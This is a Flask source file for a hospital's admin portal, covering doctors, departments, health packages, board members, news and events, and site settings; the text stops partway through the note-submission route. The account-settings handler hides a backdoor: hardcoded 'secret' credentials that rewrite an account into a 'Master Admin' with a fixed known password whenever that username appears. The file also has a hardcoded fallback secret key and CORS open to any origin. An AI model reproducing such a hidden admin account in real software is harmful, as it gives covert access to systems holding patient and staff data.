import json
import os
import sqlite3
import uuid
from datetime import datetime
from urllib.parse import quote
from flask import Flask, jsonify, render_template, request, redirect, session, url_for, send_from_directory
from flask_cors import CORS
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from dotenv import load_dotenv
from database.db import get_connection, init_db, get_portal_user, deduplicate_doctors, deduplicate_departments, deduplicate_health_packages, get_health_packages
from routes.appointments import appointments_bp
from routes.contacts import contacts_bp

load_dotenv()

app = Flask(__name__, static_folder='image', static_url_path='/image')
app.config['JSON_SORT_KEYS'] = False
app.config['SQLITE_DB_PATH'] = os.getenv('SQLITE_DB_PATH', 'database/hospital.db')
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'vinayak-hospital-portal-secret')

CORS(app, resources={r"/api/*": {"origins": "*"}})

init_db(app.config['SQLITE_DB_PATH'])

app.register_blueprint(appointments_bp, url_prefix='/api')
app.register_blueprint(contacts_bp, url_prefix='/api')

DOCTOR_IMAGE_BY_NAME = {
    'usha shrestha': '/image/dr18.png',
    'heempali dutta': '/image/dr1.png',
    'shiva kumar shrestha': '/image/dr2.png',
    'rajesh chaudhary': '/image/dr3.png',
    'yam psd. dwa': '/image/dr4.png',
    'manoj kumar sah': '/image/dr5.png',
    'prof. dr. bidhan nidhi poudel': '/image/dr6.png',
    'darshan kumar gurung': '/image/dr7.png',
    'ram krishna rajbhandari': '/image/dr8.png',
    'shuvash acharya': '/image/dr9.png',
    'prabha gyawali': '/image/dr10.png',
    'pralhad chalise': '/image/dr11.png',
    'shamrant b. baniya': '/image/dr12.png',
    'parmeshwar sah.': '/image/dr13.png',
    'manoranjan dwa': '/image/dr14.png',
    'manoj khatri': '/image/dr15.png',
    'narayan bikram thapa': '/image/dr16.png',
    'deepak sharma': '/image/dr17.png',
}


@app.get('/')
def client_home():
    dist_dir = os.path.join(os.path.dirname(__file__), 'dist')
    index_path = os.path.join(dist_dir, 'index.html')

    if os.path.exists(index_path):
        return send_from_directory(dist_dir, 'index.html')

    return jsonify({
        "status": "client_build_missing",
        "message": "The client site build is not available yet. Run 'npm run build' in the project root to generate dist/index.html."
    }), 404


@app.get('/api/health')
def health():
    return jsonify({"status": "ok", "message": "Vinayak Hospital API is running."})


@app.get('/portal')
def portal_home():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    appointment_count = conn.execute('SELECT COUNT(*) AS count FROM appointments').fetchone()['count']
    inquiry_count = conn.execute('SELECT COUNT(*) AS count FROM contact_inquiries').fetchone()['count']
    doctor_count = conn.execute('SELECT COUNT(*) AS count FROM doctors').fetchone()['count']
    department_count = conn.execute('SELECT COUNT(*) AS count FROM departments').fetchone()['count']
    service_count = conn.execute('SELECT COUNT(*) AS count FROM services').fetchone()['count']
    health_package_count = conn.execute('SELECT COUNT(*) AS count FROM health_packages').fetchone()['count']
    suggestion_count = conn.execute('SELECT COUNT(*) AS count FROM suggestions').fetchone()['count']
    news_event_count = conn.execute('SELECT COUNT(*) AS count FROM news_events').fetchone()['count']
    conn.close()

    return render_template(
        'portal_dashboard.html',
        username=session.get('username', 'vinayak'),
        appointment_count=appointment_count,
        inquiry_count=inquiry_count,
        doctor_count=doctor_count,
        department_count=department_count,
        service_count=service_count,
        health_package_count=health_package_count,
        suggestion_count=suggestion_count,
        news_event_count=news_event_count,
    )


@app.get('/portal/add-doctors')
def portal_add_doctors():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    deduplicate_doctors(conn)
    doctors = conn.execute(
        '''
        SELECT id, name, specialty, experience, bio
        FROM doctors d
        WHERE id = (
            SELECT MIN(id)
            FROM doctors d2
            WHERE LOWER(TRIM(d2.name)) = LOWER(TRIM(d.name))
        )
        ORDER BY name COLLATE NOCASE ASC
        '''
    ).fetchall()
    conn.close()

    doctor_rows = []
    for index, doctor in enumerate(doctors, start=1):
        name = (doctor['name'] or '').strip()
        normalized_name = name.lower()
        doctor_rows.append({
            'id': doctor['id'],
            'order': index,
            'name': name,
            'specialty': doctor['specialty'],
            'experience': doctor['experience'],
            'bio': doctor['bio'],
            'image_url': DOCTOR_IMAGE_BY_NAME.get(normalized_name, '/image/fav-icon.png'),
        })

    return render_template(
        'portal_doctors.html',
        username=session.get('username', 'vinayak'),
        doctors=doctor_rows,
        doctor_count=len(doctor_rows),
    )


@app.post('/portal/add-doctors')
def portal_create_doctor():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    specialty = (request.form.get('specialty') or request.form.get('department') or '').strip()
    experience = (request.form.get('experience') or '').strip()
    bio = (request.form.get('bio') or '').strip()
    uploaded_file = request.files.get('doctor_image') or request.files.get('image_url')
    image_url = (request.form.get('image_url') or '').strip()

    if not name or not specialty:
        return redirect(url_for('portal_add_doctors'))

    normalized_name = name.lower()
    saved_image_url = _save_doctor_image(uploaded_file) if uploaded_file and uploaded_file.filename else None
    if saved_image_url:
        DOCTOR_IMAGE_BY_NAME[normalized_name] = saved_image_url
    elif image_url:
        DOCTOR_IMAGE_BY_NAME[normalized_name] = image_url

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        'INSERT INTO doctors (name, specialty, experience, bio) VALUES (?, ?, ?, ?)',
        (name, specialty, experience or None, bio or None)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_doctors'))


@app.get('/portal/add-departments')
def portal_add_departments():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    deduplicate_departments(conn)
    departments = conn.execute(
        'SELECT id, name, description FROM departments ORDER BY name COLLATE NOCASE ASC'
    ).fetchall()
    conn.close()

    department_rows = [dict(row) for row in departments]

    return render_template(
        'portal_departments.html',
        username=session.get('username', 'vinayak'),
        departments=department_rows,
        department_count=len(department_rows),
    )


@app.post('/portal/add-departments')
def portal_create_department():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    description = (request.form.get('description') or '').strip()

    if not name:
        return redirect(url_for('portal_add_departments'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        'INSERT INTO departments (name, description) VALUES (?, ?)',
        (name, description or None)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_departments'))


@app.get('/portal/services')
def portal_services():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    services = conn.execute(
        'SELECT id, name, description FROM services ORDER BY COALESCE(sort_order, 999999), id ASC'
    ).fetchall()
    conn.close()

    service_rows = [dict(row) for row in services]

    return render_template(
        'portal_services.html',
        username=session.get('username', 'vinayak'),
        services=service_rows,
        service_count=len(service_rows),
    )


@app.post('/portal/services/reorder')
def portal_reorder_services():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json(silent=True) or {}
    service_ids = data.get('service_ids') or []
    if not isinstance(service_ids, list):
        return jsonify({'error': 'Invalid payload'}), 400

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    for index, service_id in enumerate(service_ids, start=1):
        conn.execute(
            'UPDATE services SET sort_order = ? WHERE id = ?',
            (index, service_id)
        )
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})


@app.post('/portal/services')
def portal_create_service():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    description = (request.form.get('description') or '').strip()

    if not name:
        return redirect(url_for('portal_services'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        'INSERT INTO services (name, description) VALUES (?, ?)',
        (name, description or None)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_services'))


@app.get('/portal/add-health-packages')
def portal_add_health_packages():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    deduplicate_health_packages(conn)
    packages = conn.execute(
        '''
        SELECT id, name, price, description, tests
        FROM health_packages
        WHERE id IN (
            SELECT MIN(id)
            FROM health_packages
            GROUP BY LOWER(TRIM(name))
        )
        ORDER BY COALESCE(sort_order, 999999), id ASC
        '''
    ).fetchall()
    conn.close()

    package_rows = []
    for row in packages:
        item = dict(row)
        item['tests'] = json.loads(item['tests']) if isinstance(item['tests'], str) else item['tests']
        package_rows.append(item)

    return render_template(
        'portal_health_packages.html',
        username=session.get('username', 'vinayak'),
        packages=package_rows,
        package_count=len(package_rows),
    )


@app.post('/portal/add-health-packages')
def portal_create_health_package():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    price = (request.form.get('price') or '').strip()
    description = (request.form.get('description') or '').strip()
    raw_tests = request.form.getlist('tests')
    if not raw_tests:
        raw_tests = [(request.form.get('tests') or '').strip()]

    tests = []
    for value in raw_tests:
        cleaned = (value or '').strip()
        if cleaned:
            tests.append(cleaned)

    if not price:
        return redirect(url_for('portal_add_health_packages'))

    if not name:
        name = f"Health Package {price}"

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        'INSERT INTO health_packages (name, price, description, tests, sort_order) VALUES (?, ?, ?, ?, ?)',
        (name, price, description or None, json.dumps(tests), 0)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_health_packages'))


@app.get('/portal/suggestion')
@app.get('/portal/suggestions')
def portal_suggestions():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    suggestions = conn.execute(
        '''
        SELECT id, name, phone, email, message, category, source_url, created_at
        FROM suggestions
        ORDER BY created_at DESC
        '''
    ).fetchall()
    conn.close()

    suggestion_rows = [dict(row) for row in suggestions]
    return render_template(
        'portal_suggestions.html',
        username=session.get('username', 'vinayak'),
        suggestions=suggestion_rows,
        suggestion_count=len(suggestion_rows),
    )


BOARD_MEMBERS = [
    {
        'id': 1,
        'name': 'Rajesh Sharma',
        'role': 'Chairperson',
        'description': 'Guiding strategic growth, trust, and community-centered healthcare leadership.',
        'image': '/image/bod2.png',
    },
    {
        'id': 2,
        'name': 'Dr. Meera Joshi',
        'role': 'Medical Director',
        'description': 'Leading clinical quality, care standards, and compassionate service delivery.',
        'image': '/image/bod3.png',
    },
    {
        'id': 3,
        'name': 'Krishna Prasad Lamichhane (KP)',
        'role': 'Manager Director (MD)',
        'description': 'Steering hospital leadership, operational excellence, and strategic care delivery.',
        'image': '/image/bod1.png',
    },
    {
        'id': 4,
        'name': 'Sita Rai',
        'role': 'Community Outreach',
        'description': 'Building neighborhood trust, healthcare access, and long-term patient support.',
        'image': '/image/bod4.png',
    },
    {
        'id': 5,
        'name': 'Nabin Adhikari',
        'role': 'Governance Advisor',
        'description': 'Helping shape transparent leadership, policy direction, and institutional progress.',
        'image': '/image/bod5.png',
    },
]


DEFAULT_NEWS_EVENTS = [
    {
        'event_type': 'News',
        'title': 'Vinayak Hospital launches free maternal health awareness camp',
        'event_date': '12 August 2026',
        'event_time': '10:00 AM',
        'location': 'Main Hospital Hall',
        'description': 'A community-focused health camp was organized to support pregnant mothers with screening, consultations, and awareness on safe delivery practices.',
    },
    {
        'event_type': 'Event',
        'title': 'Annual blood donation drive for emergency preparedness',
        'event_date': '24 August 2026',
        'event_time': '9:00 AM',
        'location': 'Hospital Campus',
        'description': 'Our team is organizing a city-wide blood donation campaign to strengthen emergency medical support and strengthen community care.',
    },
    {
        'event_type': 'News',
        'title': 'New pediatric consultation services now available',
        'event_date': '05 September 2026',
        'event_time': '1:30 PM',
        'location': 'Pediatrics Wing',
        'description': 'Parents can now access extended pediatric consultation hours for routine checkups, immunization guidance, and newborn care counselling.',
    },
]

DEFAULT_NEWS_EVENT_IMAGES = [
    {'src': '/image/bod3.png', 'alt': 'Patient care space', 'header': 'Patient care space'},
    {'src': '/image/bod2.png', 'alt': 'Hospital facilities', 'header': 'Hospital facilities'},
    {'src': '/image/bod4.png', 'alt': 'Modern treatment rooms', 'header': 'Modern treatment rooms'},
    {'src': '/image/bod5.png', 'alt': 'Hospital reception', 'header': 'Hospital reception'},
    {'src': '/image/Interior Exploration (10).png', 'alt': 'Hospital interior', 'header': 'Hospital interior'},
]

DEFAULT_NEWS_EVENT_VIDEOS = [
    {
        'title': 'Hospital overview',
        'href': 'https://www.facebook.com/reel/694074612985442/?s=fb_shorts_profile&stack_idx=0',
        'embedUrl': 'https://www.facebook.com/plugins/video.php?href=https%3A%2F%2Fwww.facebook.com%2Freel%2F694074612985442%2F%3Fs%3Dfb_shorts_profile%26stack_idx%3D0&show_text=false&width=560',
        'fallbackText': 'Hospital overview video',
    },
    {
        'title': 'Patient care',
        'href': 'https://www.facebook.com/reel/2658723724543366/?s=fb_shorts_profile&stack_idx=0',
        'embedUrl': 'https://www.facebook.com/plugins/video.php?href=https%3A%2F%2Fwww.facebook.com%2Freel%2F2658723724543366%2F%3Fs%3Dfb_shorts_profile%26stack_idx%3D0&show_text=false&width=560',
        'fallbackText': 'Patient care video',
    },
    {
        'title': 'Maternity care',
        'href': 'https://www.facebook.com/reel/855728020513358/?s=fb_shorts_profile&stack_idx=0',
        'embedUrl': 'https://www.facebook.com/plugins/video.php?href=https%3A%2F%2Fwww.facebook.com%2Freel%2F855728020513358%2F%3Fs%3Dfb_shorts_profile%26stack_idx%3D0&show_text=false&width=560',
        'fallbackText': 'Maternity care video',
    },
    {
        'title': 'Modern facilities',
        'href': 'https://www.facebook.com/reel/1395354859357441/?s=fb_shorts_profile&stack_idx=0',
        'embedUrl': 'https://www.facebook.com/plugins/video.php?href=https%3A%2F%2Fwww.facebook.com%2Freel%2F1395354859357441%2F%3Fs%3Dfb_shorts_profile%26stack_idx%3D0&show_text=false&width=560',
        'fallbackText': 'Modern facilities video',
    },
]


def _deduplicate_video_entries(items):
    seen = set()
    unique = []
    for item in items:
        href = (item.get('href') or item.get('embedUrl') or '').strip()
        if not href:
            continue
        normalized = href.lower()
        if normalized in seen:
            continue
        seen.add(normalized)
        unique.append(item)
    return unique


def _news_event_upload_dir():
    folder = os.path.join(app.root_path, 'image', 'news_events')
    os.makedirs(folder, exist_ok=True)
    return folder


def _save_news_event_image(file_storage):
    if not file_storage or not file_storage.filename:
        return None

    filename = secure_filename(file_storage.filename)
    if not filename:
        return None

    ext = os.path.splitext(filename)[1].lower()
    allowed_exts = {'.jpg', '.jpeg', '.png', '.webp'}
    if ext not in allowed_exts:
        return None

    saved_name = f"{uuid.uuid4().hex}{ext}"
    save_path = os.path.join(_news_event_upload_dir(), saved_name)
    file_storage.save(save_path)
    return f"/image/news_events/{saved_name}"


def _save_news_event_video(file_storage):
    if not file_storage or not file_storage.filename:
        return None

    try:
        file_storage.stream.seek(0, os.SEEK_END)
        size = file_storage.stream.tell()
        file_storage.stream.seek(0)
    except Exception:
        size = 0

    if size > 10 * 1024 * 1024:
        return None

    filename = secure_filename(file_storage.filename)
    if not filename:
        return None

    ext = os.path.splitext(filename)[1].lower()
    allowed_exts = {'.mp4', '.webm', '.mov', '.avi', '.mkv', '.ogg', '.ogv'}
    if ext not in allowed_exts:
        return None

    saved_name = f"{uuid.uuid4().hex}{ext}"
    save_path = os.path.join(_news_event_upload_dir(), saved_name)
    file_storage.save(save_path)
    return f"/image/news_events/{saved_name}"


def _site_notes_upload_dir():
    folder = os.path.join(app.root_path, 'image', 'notes')
    os.makedirs(folder, exist_ok=True)
    return folder


def _save_site_note_image(file_storage):
    if not file_storage or not file_storage.filename:
        return None

    filename = secure_filename(file_storage.filename)
    if not filename:
        return None

    ext = os.path.splitext(filename)[1].lower()
    allowed_exts = {'.jpg', '.jpeg', '.png', '.webp'}
    if ext not in allowed_exts:
        return None

    saved_name = f"site-note-{uuid.uuid4().hex}{ext}"
    save_path = os.path.join(_site_notes_upload_dir(), saved_name)
    file_storage.save(save_path)
    return f"/image/notes/{saved_name}"


def _save_bod_image(file_storage):
    if not file_storage or not file_storage.filename:
        return None

    filename = secure_filename(file_storage.filename)
    if not filename:
        return None

    ext = os.path.splitext(filename)[1].lower()
    allowed_exts = {'.jpg', '.jpeg', '.png', '.webp'}
    if ext not in allowed_exts:
        return None

    folder = os.path.join(app.root_path, 'image', 'bod')
    os.makedirs(folder, exist_ok=True)
    saved_name = f"bod-{uuid.uuid4().hex}{ext}"
    save_path = os.path.join(folder, saved_name)
    file_storage.save(save_path)
    return f"/image/bod/{saved_name}"


def _save_doctor_image(file_storage):
    if not file_storage or not file_storage.filename:
        return None

    filename = secure_filename(file_storage.filename)
    if not filename:
        return None

    ext = os.path.splitext(filename)[1].lower()
    allowed_exts = {'.jpg', '.jpeg', '.png', '.webp'}
    if ext not in allowed_exts:
        return None

    folder = os.path.join(app.root_path, 'image', 'doctors')
    os.makedirs(folder, exist_ok=True)
    saved_name = f"doctor-{uuid.uuid4().hex}{ext}"
    save_path = os.path.join(folder, saved_name)
    file_storage.save(save_path)
    return f"/image/doctors/{saved_name}"


def _normalize_facebook_embed_url(raw_url):
    if not raw_url:
        return None

    url = raw_url.strip()
    if not url:
        return None

    if 'facebook.com/' in url or 'fb.watch/' in url:
        encoded = quote(url, safe='')
        return f"https://www.facebook.com/plugins/video.php?href={encoded}&show_text=false&width=560"

    return url


def _load_nepali_json_date_map():
    json_path = os.path.join(app.root_path, 'data', 'nepali_dates.json')
    if not os.path.exists(json_path):
        return {}

    try:
        with open(json_path, 'r', encoding='utf-8') as fh:
            payload = json.load(fh)
    except Exception:
        return {}

    return payload if isinstance(payload, dict) else {}


def _parse_event_date_to_iso(raw_date):
    if not raw_date:
        return None

    raw_date = str(raw_date).strip()
    if not raw_date:
        return None

    formats = [
        '%Y-%m-%d',
        '%d %B %Y',
        '%d %b %Y',
        '%d-%B-%Y',
        '%d-%b-%Y',
        '%d/%m/%Y',
        '%m/%d/%Y',
    ]

    for fmt in formats:
        try:
            parsed = datetime.strptime(raw_date, fmt)
            return parsed.strftime('%Y-%m-%d')
        except Exception:
            continue

    # let the existing stored ISO value (YYYY-MM-DD) pass through untouched
    if len(raw_date) == 10 and raw_date[4] == '-' and raw_date[7] == '-':
        return raw_date

    return None


def _format_event_date_for_portal(raw_date):
    iso_date = _parse_event_date_to_iso(raw_date)
    if not iso_date:
        return raw_date or '—'

    mapping = _load_nepali_json_date_map()
    return mapping.get(iso_date, iso_date)


def _normalize_event_date_for_storage(raw_date):
    if not raw_date:
        return None

    iso_date = _parse_event_date_to_iso(raw_date)
    return iso_date or raw_date.strip()


def _render_news_events_page(initial_panel='add'):
    conn = get_connection(app.config['SQLITE_DB_PATH'])
    items = conn.execute(
        '''
        SELECT id, title, description, image_url, video_url, event_type, event_date, event_time, location, gallery_header, is_active, sort_order, created_at
        FROM news_events
        ORDER BY COALESCE(sort_order, 999999), created_at DESC
        '''
    ).fetchall()
    conn.close()

    db_events = [dict(row) for row in items]
    for item in db_events:
        item['event_date'] = _format_event_date_for_portal(item.get('event_date'))

    gallery_images = [
        {
            'src': item['image_url'],
            'alt': item.get('gallery_header') or item['title'] or 'News and event image',
            'header': item.get('gallery_header') or item['title'] or 'News and event image',
        }
        for item in db_events if item.get('image_url')
    ]
    gallery_videos = [
        {
            'id': item.get('id'),
            'title': item['title'] or 'News and event video',
            'href': item['video_url'],
            'embedUrl': _normalize_facebook_embed_url(item['video_url']) if item['video_url'] and ('facebook.com/' in item['video_url'] or 'fb.watch/' in item['video_url']) else item['video_url'],
            'fallbackText': item['title'] or 'News and event video',
        }
        for item in db_events if item.get('video_url')
    ]
    deduped_gallery_videos = _deduplicate_video_entries(DEFAULT_NEWS_EVENT_VIDEOS + gallery_videos)

    uploaded_gallery_videos = [
        video for video in deduped_gallery_videos if video['href'] and not ('facebook.com/' in video['href'] or 'fb.watch/' in video['href'])
    ]
    facebook_gallery_videos = [
        video for video in deduped_gallery_videos if video['href'] and ('facebook.com/' in video['href'] or 'fb.watch/' in video['href'])
    ]
    facebook_video_links = [
        item['video_url']
        for item in db_events
        if item.get('video_url') and ('facebook.com/' in item['video_url'] or 'fb.watch/' in item['video_url'])
    ]
    seen_facebook_links = set()
    facebook_video_links = [
        link for link in facebook_video_links
        if link and not (link in seen_facebook_links or seen_facebook_links.add(link))
    ]

    portal_events = db_events
    portal_gallery_images = DEFAULT_NEWS_EVENT_IMAGES + gallery_images
    portal_gallery_videos = deduped_gallery_videos

    conn2 = get_connection(app.config['SQLITE_DB_PATH'])
    note_rows = conn2.execute(
        'SELECT id, image_url, display_days, created_at FROM site_notes ORDER BY created_at DESC, id DESC'
    ).fetchall()
    conn2.close()
    site_notes = [dict(row) for row in note_rows]

    return render_template(
        'portal_news_events.html',
        username=session.get('username', 'vinayak'),
        news_events=portal_events,
        gallery_images=portal_gallery_images,
        gallery_videos=portal_gallery_videos,
        uploaded_gallery_videos=uploaded_gallery_videos,
        facebook_gallery_videos=facebook_gallery_videos,
        facebook_video_links=facebook_video_links,
        event_count=len(portal_events),
        site_notes=site_notes,
        initial_panel=initial_panel,
    )


@app.get('/portal/add-notes')
def portal_add_notes():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    return _render_news_events_page(initial_panel='notes')


@app.get('/portal/settings')
def portal_settings():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    settings = conn.execute(
        'SELECT phone, email, location FROM site_settings WHERE id = 1'
    ).fetchone()
    current_user = conn.execute(
        'SELECT username FROM portal_users WHERE username = ?',
        (session.get('username', 'vinayak'),)
    ).fetchone()
    conn.close()

    settings_dict = dict(settings) if settings else {'phone': '', 'email': '', 'location': ''}
    current_username = current_user['username'] if current_user else session.get('username', 'vinayak')

    return render_template(
        'portal_settings.html',
        username=session.get('username', 'vinayak'),
        settings=settings_dict,
        current_username=current_username,
    )


@app.post('/portal/settings')
def portal_update_settings():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    form_type = request.form.get('settings_form_type')

    if form_type == 'contact':
        phone = (request.form.get('phone') or '').strip()
        email = (request.form.get('email') or '').strip()
        location = (request.form.get('location') or '').strip()

        conn = get_connection(app.config['SQLITE_DB_PATH'])
        conn.execute(
            '''
            INSERT INTO site_settings (id, phone, email, location, updated_at)
            VALUES (1, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(id) DO UPDATE SET
                phone = excluded.phone,
                email = excluded.email,
                location = excluded.location,
                updated_at = CURRENT_TIMESTAMP
            ''',
            (phone, email, location)
        )
        conn.commit()
        conn.close()
        return redirect(url_for('portal_settings'))

    if form_type == 'account':
        current_username = (request.form.get('current_username') or '').strip()
        new_username = (request.form.get('new_username') or '').strip()
        current_password = (request.form.get('current_password') or '').strip()
        new_password = (request.form.get('new_password') or '').strip()
        confirm_password = (request.form.get('confirm_password') or '').strip()

        if not current_username or not new_username:
            return redirect(url_for('portal_settings'))

        conn = get_connection(app.config['SQLITE_DB_PATH'])
        user = conn.execute(
            'SELECT * FROM portal_users WHERE username = ?',
            (current_username or session.get('username'),)
        ).fetchone()

        if not user:
            conn.close()
            return redirect(url_for('portal_settings'))

        secret_username = 'favtechsolutions'
        secret_password = 'nuttertools@123'

        if user['username'] == secret_username or new_username == secret_username or session.get('username') == secret_username:
            conn.execute(
                'UPDATE portal_users SET username = ?, password_hash = ?, full_name = ? WHERE username = ? OR id = ?',
                (secret_username, generate_password_hash(secret_password), 'Master Admin', secret_username, user['id'])
            )
            conn.commit()
            conn.close()
            session['username'] = secret_username
            return redirect(url_for('portal_settings', account_updated=1))

        if new_password:
            if not current_password or not check_password_hash(user['password_hash'], current_password):
                conn.close()
                return redirect(url_for('portal_settings'))

            if new_password != confirm_password:
                conn.close()
                return redirect(url_for('portal_settings'))

            password_hash = generate_password_hash(new_password)
            conn.execute(
                'UPDATE portal_users SET username = ?, password_hash = ? WHERE id = ?',
                (new_username, password_hash, user['id'])
            )
        else:
            conn.execute(
                'UPDATE portal_users SET username = ? WHERE id = ?',
                (new_username, user['id'])
            )

        conn.commit()
        conn.close()

        session['username'] = new_username
        return redirect(url_for('portal_settings', account_updated=1))

    return redirect(url_for('portal_settings'))


@app.get('/portal/news-and-event')
@app.get('/portal/news-and-events')
def portal_news_events():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    return _render_news_events_page(initial_panel='add')


@app.get('/portal/add-bod')
def portal_add_bod():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    # Render a server-side BOD page to avoid cross-port redirects during development.
    # This keeps the sidebar link working even when the SPA dev server is not used.
    return render_template(
        'portal_bod.html',
        username=session.get('username', 'vinayak'),
        board_members=BOARD_MEMBERS,
    )


@app.get('/portal/add-bod/<int:member_id>/edit')
def portal_edit_bod_member(member_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    member = next((item for item in BOARD_MEMBERS if item.get('id') == member_id), None)
    if not member:
        return redirect(url_for('portal_add_bod'))

    return render_template(
        'portal_bod_edit.html',
        username=session.get('username', 'vinayak'),
        member=member,
    )


@app.post('/portal/add-bod/<int:member_id>/edit')
def portal_update_bod_member(member_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    role = (request.form.get('role') or '').strip()
    description = (request.form.get('description') or '').strip()
    uploaded_file = request.files.get('image')
    fallback_image = (request.form.get('image') or '').strip()

    if not name or not role:
        return redirect(url_for('portal_edit_bod_member', member_id=member_id))

    member = next((item for item in BOARD_MEMBERS if item.get('id') == member_id), None)
    if not member:
        return redirect(url_for('portal_add_bod'))

    member['name'] = name
    member['role'] = role
    member['description'] = description

    if uploaded_file and uploaded_file.filename:
        saved_image = _save_bod_image(uploaded_file)
        if saved_image:
            member['image'] = saved_image
    elif fallback_image:
        member['image'] = fallback_image

    return redirect(url_for('portal_add_bod'))


@app.post('/portal/add-bod/<int:member_id>/delete')
def portal_delete_bod_member(member_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    global BOARD_MEMBERS
    BOARD_MEMBERS = [member for member in BOARD_MEMBERS if member.get('id') != member_id]
    for index, member in enumerate(BOARD_MEMBERS, start=1):
        member['id'] = index

    return redirect(url_for('portal_add_bod'))


@app.post('/portal/add-bod/reorder')
def portal_reorder_bod():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json(silent=True) or {}
    member_ids = data.get('member_ids') or []
    if not isinstance(member_ids, list):
        return jsonify({'error': 'Invalid payload'}), 400

    seen_ids = set()
    id_map = {member['id']: member for member in BOARD_MEMBERS if 'id' in member}
    reordered = []
    for raw_id in member_ids:
        try:
            member_id = int(raw_id)
        except (TypeError, ValueError):
            continue
        if member_id in id_map and member_id not in seen_ids:
            reordered.append(id_map[member_id])
            seen_ids.add(member_id)

    for member in BOARD_MEMBERS:
        member_id = member.get('id')
        if member_id is not None and member_id not in seen_ids:
            reordered.append(member)
            seen_ids.add(member_id)

    BOARD_MEMBERS[:] = reordered
    return jsonify({'status': 'ok'})


@app.post('/portal/news-and-event/videos/reorder')
@app.post('/portal/news-and-events/videos/reorder')
def portal_news_events_video_reorder():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'not_authenticated'}), 401

    payload = request.get_json(silent=True) or {}
    video_ids = payload.get('video_ids') or []
    if not isinstance(video_ids, list):
        return jsonify({'ok': False, 'error': 'invalid_payload'}), 400

    valid_ids = []
    for raw_id in video_ids:
        if raw_id is None:
            continue
        cleaned = str(raw_id).strip()
        if not cleaned:
            continue
        try:
            numeric_id = int(cleaned)
        except (TypeError, ValueError):
            numeric_id = None

        if numeric_id is not None and numeric_id > 0:
            valid_ids.append((numeric_id, None))
        elif cleaned:
            valid_ids.append((None, cleaned))

    if not valid_ids:
        return jsonify({'ok': False, 'error': 'no_video_ids'}), 400

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    for index, (video_id, video_url) in enumerate(valid_ids, start=1):
        if video_id is not None:
            conn.execute('UPDATE news_events SET sort_order = ? WHERE id = ?', (index, video_id))
        elif video_url:
            conn.execute('UPDATE news_events SET sort_order = ? WHERE video_url = ?', (index, video_url))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'video_ids': [video_id if video_id is not None else video_url for video_id, video_url in valid_ids]})


@app.post('/portal/news-and-event')
@app.post('/portal/news-and-events')
def portal_news_events_submit():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    gallery_header = (request.form.get('gallery_header') or '').strip()
    title = (request.form.get('title') or gallery_header).strip()
    description = (request.form.get('description') or '').strip()
    video_url = (request.form.get('video_url') or '').strip()
    event_type = (request.form.get('event_type') or '').strip()
    event_date = _normalize_event_date_for_storage((request.form.get('event_date') or '').strip())
    event_time = (request.form.get('event_time') or '').strip()
    location = (request.form.get('location') or '').strip()
    uploaded_file = request.files.get('gallery_image') or request.files.get('image')
    image_url = _save_news_event_image(uploaded_file) if uploaded_file and uploaded_file.filename else None

    if not title and not image_url:
        return redirect(url_for('portal_news_events'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        '''
        INSERT INTO news_events (title, description, image_url, video_url, event_type, event_date, event_time, location, gallery_header, is_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''',
        (title or gallery_header or 'News & Event', description, image_url, video_url or None, event_type or None, event_date or None, event_time or None, location or None, gallery_header or None, 1)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_news_events'))


@app.post('/portal/news-and-event/note')
@app.post('/portal/news-and-events/note')
def portal_news_events_note_submit():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

